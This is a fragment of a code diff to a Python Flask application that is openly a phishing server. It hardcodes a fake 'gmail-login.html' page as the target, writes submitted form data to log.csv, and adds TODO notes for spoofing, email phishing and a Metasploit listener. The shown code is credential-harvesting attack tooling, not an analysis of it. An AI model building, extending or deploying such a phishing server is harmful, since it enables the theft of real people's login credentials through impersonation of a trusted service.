@@ -7,6 +7,7 @@ import ipaddress
 from kamene.all import *
 import netifaces
 import re
+import multiprocessing
 from flask import Flask, request, render_template, redirect
 
 
@@ -81,7 +82,8 @@ def validate(local_ip, email_address):
 
 @app.route('/', methods=['GET', 'POST'])
 def phishing_server():
-    target = sys.argv[1]
+    # target = sys.argv[1]
+    target = 'gmail-login.html'
     if request.method == 'POST':
         with open('log.csv', 'w+', newline='') as csvfile:
             writer = csv.DictWriter(csvfile, fieldnames=FIELDNAMES)
@@ -188,6 +190,9 @@ def email():
 
 @app.route('/start', methods=['GET', 'POST'])
 def start():
+    # TODO: Spoofing
+    # TODO: EMail phishing x2
+    # TODO: Metasploit listener
     return render_template(
         'start.html',
         response=[],
